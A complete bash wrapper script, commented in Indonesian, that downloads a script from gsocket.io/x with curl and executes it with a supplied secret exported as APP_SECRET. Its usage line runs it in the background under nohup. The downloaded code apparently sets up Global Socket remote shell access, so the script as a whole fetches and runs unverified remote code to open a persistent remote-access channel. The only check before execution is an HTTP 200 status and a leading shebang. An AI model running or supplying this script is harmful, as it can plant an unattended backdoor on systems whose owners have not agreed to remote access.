#!/usr/bin/env bash
# ~/wrapper.sh
# Wrapper yang:
# - memastikan SECRET ada
# - jika ~/gsocket_x.sh tidak ada, akan mencoba download + validasi (shebang + http 200)
# - menjalankan ~/gsocket_x.sh dengan env APP_SECRET set
#
# Usage:
# SECRET='rahasia123' nohup ~/wrapper.sh > /tmp/gsocket.log 2>&1 &

GS_URL="https://gsocket.io/x"
OUT="$HOME/gsocket_x.sh"
TRIES=8
SLEEP=2

# 1) cek SECRET
if [[ -z "$SECRET" ]]; then
  echo "$(date +'%F %T') ERROR: SECRET unset" >&2
  exit 1
fi

# 2) fungsi download & validasi
download_and_check() {
  local try=1
  while (( try <= TRIES )); do
    echo "$(date +'%F %T') Attempt $try: downloading $GS_URL ..."
    # simpan body ke tmp file, capture http code
    tmpf="$(mktemp)"
    http_code="$(curl -sS -w "%{http_code}" -o "$tmpf" "$GS_URL" || echo "000")"
    if [[ "$http_code" == "200" ]] && head -n1 "$tmpf" | grep -qE '^#!'; then
      mv -f "$tmpf" "$OUT"
      chmod 700 "$OUT"
      echo "$(date +'%F %T') OK: downloaded valid script to $OUT (http=$http_code)"
      return 0
    fi
    echo "$(date +'%F %T') Failed (http=$http_code or no shebang). Retrying in $SLEEP s..."
    rm -f "$tmpf"
    try=$((try+1))
    sleep "$SLEEP"
  done
  return 1
}

# 3) jika file belum ada, download
if [[ ! -f "$OUT" ]]; then
  echo "$(date +'%F %T') $OUT not found — attempting to download..."
  if ! download_and_check; then
    echo "$(date +'%F %T') ERROR: Could not download valid script after $TRIES tries" >&2
    exit 2
  fi
else
  # kalau sudah ada, pastikan executable & tampilan singkat isi
  chmod 700 "$OUT" 2>/dev/null || true
  echo "$(date +'%F %T') Found existing $OUT (size=$(stat -c%s "$OUT") bytes)"
  if ! head -n1 "$OUT" | grep -qE '^#!'; then
    echo "$(date +'%F %T') WARNING: $OUT does not start with shebang; attempting re-download..."
    if ! download_and_check; then
      echo "$(date +'%F %T') ERROR: re-download failed" >&2
      exit 3
    fi
  fi
fi

# 4) export secret and exec script (replace current process)
export APP_SECRET="$SECRET"
echo "$(date +'%F %T') Executing $OUT ..."
exec bash "$OUT"
# exec should not return; if it does:
echo "$(date +'%F %T') ERROR: exec returned" >&2
exit 4
